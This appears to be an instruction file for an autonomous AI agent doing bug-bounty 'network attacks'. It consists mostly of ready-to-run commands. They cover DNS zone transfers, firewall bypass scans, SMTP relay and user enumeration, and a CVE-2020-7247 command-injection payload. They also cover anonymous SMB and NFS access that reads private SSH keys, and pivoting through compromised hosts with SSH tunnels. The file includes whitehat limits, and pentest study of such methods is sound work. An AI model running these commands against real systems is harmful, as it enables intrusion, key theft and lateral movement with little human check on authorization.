---
disable-model-invocation: true
context: fork
---

# Network Attacks v1.0 — Firewall Bypass, DNS Abuse, Protocol Exploitation & Pivoting
**Owner: cyber-operator**
**Trigger:** Called by Sweep Engine Overseer #8 (OS/Network Track) — Sub-Agent C (alongside privilege-escalation.md)
**Classification:** ZERO-AUTH (DNS/passive), AUTH-CREATABLE (active bypass + pivoting)
**Purpose:** Network-layer attack methodology covering PF ruleset analysis, DNS exploitation, firewall bypass techniques, server service attacks (SMTP, SMB, NFS), and network pivoting.

---

## When This File Activates

Auto-activate when:
- Target has DNS service (port 53 open)
- Target is confirmed OpenBSD (PF firewall likely in use)
- Multiple services open suggesting internal network exposure
- Shell access obtained → check for network pivot opportunities
- SMB/NFS/RPC ports open (445, 2049, 111)
- Bug bounty scope includes infrastructure or internal network segments

---

## PART 1: DNS Exploitation

### Zone Transfer (AXFR) — Zero-Auth
```bash
# Attempt zone transfer — reveals ALL DNS records for domain
dig AXFR @{TARGET_IP} {TARGET_DOMAIN}
# or:
host -t AXFR {TARGET_DOMAIN} {TARGET_IP}

# If successful: CRITICAL finding
# Evidence: Full DNS zone dump showing internal hostnames, IP ranges, internal services
# CVSS: 5.3 (AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N) — info disclosure
# PAYOUT: $500-$5K depending on what's exposed

# Test all name servers:
dig NS {TARGET_DOMAIN} | grep "IN NS" | awk '{print $5}' | while read ns; do
  echo "Testing: $ns"
  dig AXFR @$ns {TARGET_DOMAIN}
done
```

### DNS Enumeration (Zero-Auth)
```bash
# Brute force subdomains via DNS
# Method 1: Wordlist-based
for sub in www mail ftp vpn dev staging api admin portal internal test; do
  result=$(dig +short $sub.{TARGET_DOMAIN} 2>/dev/null)
  [ -n "$result" ] && echo "$sub.{TARGET_DOMAIN} → $result"
done

# Method 2: PTR reverse lookup (find all IPs in range)
for i in $(seq 1 254); do
  host {TARGET_NETWORK}.$i 2>/dev/null | grep -v "NXDOMAIN"
done

# Method 3: SOA record analysis
dig SOA {TARGET_DOMAIN}
# Returns: primary nameserver, responsible email, serial number
```

### DNS Cache Poisoning (Assessment Only)
```bash
# Check if recursive queries allowed (enables cache poisoning)
dig @{TARGET_IP} {external_domain}  # e.g., dig @target.com google.com
# If returns answer → recursive queries open → poisoning risk
# File as misconfiguration (low-medium depending on exposure)
```

---

## PART 2: PF (Packet Filter) Analysis — OpenBSD Specific

PF is OpenBSD's default firewall. Misconfigurations can expose internal services or allow bypass.

### PF Ruleset Enumeration (If Shell Access)
```bash
# Dump full PF ruleset (requires root or doas pfctl permission)
pfctl -sr    # show rules
pfctl -sa    # show all (rules, NAT, state table)
pfctl -st    # show state table (active connections)
pfctl -ss    # show connection states

# Check for:
# - pass all → no filtering (misconfiguration)
# - pass in on egress from any to any → too permissive ingress
# - NAT rules exposing internal hosts
# - anchor rules that redirect traffic
```

### PF Bypass Techniques

#### IPv6 Bypass (if PF has IPv4-only rules)
```bash
# Test if target has IPv6 enabled but PF only covers IPv4
ping6 {TARGET_IPV6}
nmap -6 {TARGET_IPV6}

# Many PF configs filter IPv4 extensively but leave IPv6 open
# IPv6 address from IPv4: ::ffff:{octets} or check AAAA records
dig AAAA {TARGET_DOMAIN}
```

#### Port Knocking Discovery
```bash
# Some OpenBSD systems use port knocking to hide SSH
# Try common knock sequences:
for port in 7000 8000 9000 1234 4321; do
  nc -zv -w1 {TARGET_IP} $port 2>/dev/null
done

# Then immediately test SSH
nc -zv -w3 {TARGET_IP} 22
```

#### Fragmented Packet Bypass
```bash
# Some simple packet filters don't reassemble fragments
nmap -f {TARGET_IP}              # 8-byte fragments
nmap --mtu 16 {TARGET_IP}        # custom MTU fragments
nmap -D RND:10 {TARGET_IP}       # decoy scan (obscures source)

# Note: Only use if authorized — this is aggressive scanning
```

---

## PART 3: SMTP Exploitation

### Open Relay Test (Zero-Auth)
```bash
# Connect and test if relay is open (can send mail as arbitrary sender)
nc -nv -w5 {TARGET_IP} 25

# Send test:
EHLO test.com
MAIL FROM:<attacker@evil.com>
RCPT TO:<victim@external.com>
DATA
Subject: Open Relay Test
Test
.
QUIT

# If "250 Ok" returned for external RCPT TO → OPEN RELAY CONFIRMED
# Evidence: Session transcript showing relay accepted
# CVSS: 5.8 (AV:N/AC:L/PR:N/UI:N/S:C/C:N/I:L/A:N)
# PAYOUT: $500-$5K (spam/phishing enablement)
```

### SMTP User Enumeration (Zero-Auth)
```bash
# VRFY command — verify if user exists
nc -nv -w5 {TARGET_IP} 25

VRFY root          # 250 = valid user | 550 = invalid
VRFY admin
VRFY postmaster

# EXPN command — expand mailing list
EXPN all-staff

# RCPT TO enumeration (if VRFY disabled):
EHLO test.com
MAIL FROM:<test@test.com>
RCPT TO:<root@{TARGET_DOMAIN}>      # 250 = valid | 550 = invalid
RCPT TO:<admin@{TARGET_DOMAIN}>
```

### OpenSMTPD CVE Exploitation Assessment

```bash
# Check OpenSMTPD version from banner
nc -nv -w5 {TARGET_IP} 25
# Banner example: "220 hostname.tld ESMTP OpenSMTPD"

# CVE-2020-7247 (CVSS 9.8 — RCE)
# Affected: OpenSMTPD < 6.6.2p1
# Vector: Malicious MAIL FROM address with command injection
# Payload: MAIL FROM:<"$(evil command)"@domain.com>
# Note: Only attempt on CTF/authorized lab — this is destructive

# CVE-2020-8794 (CVSS 9.8 — LPE + OOB write)
# Affected: OpenSMTPD < 6.6.4
# Requires local access — hand to privilege-escalation.md

# For bounty: Document version + CVE match as finding
# Evidence: Banner showing vulnerable version
# File as: "OpenSMTPD {version} affected by CVE-2020-7247 (CVSS 9.8)"
```

---

## PART 4: SMB Attacks (Linux/Windows with Samba)

### SMB Enumeration (Zero-Auth)
```bash
# Check SMB version + security mode
nmap --script smb-security-mode,smb-os-discovery -p 445,139 {TARGET_IP}

# List shares anonymously
smbclient -L //{TARGET_IP}/ -N
# -N = no password (anonymous)
# Look for: readable shares (DISK type without auth)

# Connect to readable share
smbclient //{TARGET_IP}/{SHARE_NAME} -N
# smb: \> ls     ← list files
# smb: \> get sensitive_file.txt

# Null session test (older Samba/Windows)
rpcclient -U "" -N {TARGET_IP}
# rpcclient $> enumdomusers     ← list domain users
# rpcclient $> enumdomgroups    ← list groups
```

### EternalBlue / MS17-010 Check (Zero-Auth)
```bash
# Safe detection only (no exploitation in bounty context)
nmap --script smb-vuln-ms17-010 -p 445 {TARGET_IP}
# If VULNERABLE: File as critical finding with CVE evidence
# Do NOT exploit — document detection as POC
```

---

## PART 5: NFS Exploitation

### NFS Mount Enumeration (Zero-Auth)
```bash
# Step 1: Check if RPC portmapper running
nmap -sV -p 111 {TARGET_IP}
rpcinfo -p {TARGET_IP}   # list all RPC services + ports

# Step 2: Show NFS exports
showmount -e {TARGET_IP}
# Example output:
# /home/data *        ← exported to everyone = CRITICAL
# /var/backup 10.0.0.0/8
# /etc 192.168.1.0/24

# Step 3: Mount accessible export (if permitted)
mkdir /tmp/nfs_mount
mount -t nfs {TARGET_IP}:/home/data /tmp/nfs_mount

# Read exported files
ls -la /tmp/nfs_mount
cat /tmp/nfs_mount/.ssh/authorized_keys    # SSH key theft
cat /tmp/nfs_mount/id_rsa                  # Private key theft

# NFS root_squash bypass (if no_root_squash set):
# If the export has no_root_squash: local root = remote root on the share
# Evidence: showmount output + directory listing = CRITICAL
```

---

## PART 6: Network Pivoting (Post-Shell)

When shell access obtained, check for internal network access:

### Internal Network Discovery
```bash
# Step 1: Identify network interfaces
ip addr show        # or: ifconfig
ip route show

# Step 2: Scan internal network from compromised host
# Quick ping sweep:
for i in $(seq 1 254); do
  (ping -c1 -W1 10.0.0.$i &>/dev/null && echo "ALIVE: 10.0.0.$i") &
done; wait

# Internal nmap via shell:
nmap -sn 10.0.0.0/24      # host discovery
nmap -sV -p- 10.0.0.X     # full scan of interesting host
```

### SSH Tunnel / SOCKS Proxy
```bash
# Create SOCKS5 proxy through compromised host (from attacker machine)
ssh -D 1080 -N {user}@{COMPROMISED_HOST}
# Then: set proxychains to 127.0.0.1:1080
# proxychains nmap -sV {INTERNAL_TARGET}

# Port forward to access internal service
ssh -L 8080:{INTERNAL_IP}:{INTERNAL_PORT} {user}@{COMPROMISED_HOST}
# Then: curl http://127.0.0.1:8080/

# Document: internal network topology, services reachable only through pivot
# Evidence: Network diagram + service list
# Filing: "SSRF to Internal Network" or "Unauthorized Network Access" finding
```

---

## Output Schema

```json
{
  "vector": "SMTP Open Relay",
  "target": "smtp://192.168.1.50:25",
  "service": "OpenSMTPD 6.8.0",
  "technique_file": "network-attacks.md",
  "status": "CONFIRMED",
  "POC_confirmed": true,
  "confidence": 0.90,
  "evidence": "RCPT TO:<external@gmail.com> returned 250 Ok — relay accepted arbitrary external recipient",
  "payout_ceiling": 3000,
  "auth_required": false,
  "escalation": "MEDIUM",
  "CVE": "N/A — misconfiguration",
  "next_vector": "VRFY user enumeration + smtp-user-enum for credential targets"
}
```

---

## Delivery Format

```
NETWORK ATTACKS COMPLETE — [Target]
DNS: Zone transfer FAILED | PTR recon: 12 internal hosts discovered
PF: Version analysis — possible IPv6 bypass (testing)
SMTP: Open relay CONFIRMED on port 25 | VRFY enabled (user enum possible)
SMB: Anonymous share access on \\TARGET\public — 3 files retrieved
NFS: /home/data exported to * — mounted, SSH key found at /home/data/.ssh/
Pivot: Internal network 10.0.0.0/24 visible from host — 8 live IPs
High-priority findings: 3 (SMTP relay, NFS world export, SSH key)
```

---

## Whitehat Constraints

```
NETWORK ATTACK LIMITS:
  - NEVER send actual spam via open relay — send only test message to OWN address
  - NEVER perform ARP spoofing or MitM on shared network segments
  - NFS mount: read only for evidence, NEVER write to mounted share
  - SMB: enumerate and read only — no file modification
  - Pivoting: document paths only — do NOT attack internal systems unless explicitly in scope
  - Max 3 requests per detection test — no automated brute force on network services
```

---

*Network Attacks v1.0 | Zero-Auth + Auth-Creatable Track | Sweep Engine Overseer #8 Sub-Agent C*
